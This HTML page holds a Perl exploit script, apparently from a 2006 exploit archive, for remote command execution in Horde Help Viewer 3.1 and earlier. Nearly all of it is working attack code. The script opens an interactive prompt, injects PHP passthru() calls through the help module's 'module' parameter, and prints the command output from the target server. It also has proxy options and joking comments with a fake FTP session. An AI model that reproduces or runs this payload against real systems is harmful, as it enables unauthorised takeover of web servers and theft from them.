<html><head><title>Horde Help Viewer <= 3.1 Remote Command Execution Exploit </title></head><pre>#!/usr/bin/perl 
# Wed Apr  5 21:51:12 CEST 2006 jolascoaga@514.es
#
# Horde help module remote execution
# 
# telnet 310.27.901.33.1109 1689 # thanks horatio for the address
# USER paranoia
# PASS total
# SYST
# REST 100
# REST 0
# PWD
# TYPE A
# PASV
# LIST
# CWD 0days
# GET horddy.pl
#
# w0w this damn 0day ftp is so sexy!
# 
# GO GO GO !! GO GO GO !! Team fall back!
# 
# Example: ./horddy.pl --host=http://www.server.com/horde
# 
# Now for your X-box !
# 
# Greets:
#  - all 514 crew 
#  - mallorca ppl r0xing.
#
# THIS IS PENE! TIMMY!!! LIVIN' A LIE!
# 
 

use strict;
use LWP::UserAgent;
use LWP::Simple;
use HTTP::Request;
use HTTP::Response;
use Getopt::Long;

$| = 1;   # mess with the best? don't mess with my buffer

my ($proxy,$proxy_user,$proxy_pass);
my ($host,$debug,$dir, $command);
my $use_ssl = 0;

my $options = GetOptions (
  'host=s'      =&gt; \$host, 
  'dir=s'      =&gt; \$dir,
  'proxy=s'           =&gt; \$proxy,
  'proxy_user=s'      =&gt; \$proxy_user,
  'proxy_pass=s'      =&gt; \$proxy_pass,
  'debug'             =&gt; \$debug);

&amp;help unless ($host); # please don't try this at home.

$dir = &quot;/horde/&quot; unless($dir);
print &quot;$host - $dir\n&quot;;

while () {
print &quot;horddy&gt; &quot;; # lost connection
while(&lt;STDIN&gt;) {
$command=$_;
chomp($command);
last;
}
&amp;send($command);
}

sub buildcmd {# this is a useful comment
my ($cmd) = @_;
# wonderful hacking
$cmd =~ s/ /\%20/gi;
$cmd =~ s/\//\&quot;\.chr\(47\)\.\&quot;/gi;

return $cmd;
}

sub send {
    my ($tmp) = @_;
    my $ok=0;
    my $cmd = buildcmd ($tmp); # this is really magic ^^
    my $socket;
    LWP::Debug::level('+') if $debug; # but remember this is crap :D

    my $ua = new LWP::UserAgent();   
    $ua-&gt;agent(&quot;Nozilla/P.N (Just for IDS woring)&quot;); # this is not me :/

    my $string = &quot;/$dir/services/help/?show=about&amp;module=;\&quot;.passthru(\&quot;$cmd\&quot;);'.&quot;;

    if ($host !~ /^http/) {
$host = sprintf (&quot;http://%s&quot;, $host); # CRAP CRAP CRAP
    }

    my $req = HTTP::Request-&gt;new (GET =&gt; $host.$string);
    $ua-&gt;proxy(['http'] =&gt; $proxy) if $proxy;
    $req-&gt;proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;

    print $req-&gt;as_string() if $debug; 

    my $res = $ua-&gt;request($req);
    my $html = $res-&gt;content(); 

    foreach (split(/\n/,$html)) {
if ((/&lt;h2/) or (/&lt;br \/&gt;/)) { # brum brum conditionals desmitified
last;
}
print &quot;$_\n&quot; if $ok eq &quot;1&quot;; # i don't think this is usefull 
if (/&lt;body class=/) {
$ok = 1;
}  
    }
}

sub help {
    print &quot;Syntax: ./$0 --host=url --dir=/horde [options]\n&quot;;
    print &quot;\t--proxy (http), --proxy_user, --proxy_pass\n&quot;;
    print &quot;\t--debug\n&quot;;
    print &quot;the default directory is /horde\n&quot;;
    print &quot;\nExample\n&quot;;
    print &quot;bash# $0 --host=http(s)://www.server.com/\n&quot;;
    print &quot;\n&quot;;
    exit(1);
}
exit 0;
# y00000w this is the best part.
# remember mallorca es fonki :D

# milw0rm.com [2006-04-07]</pre></html>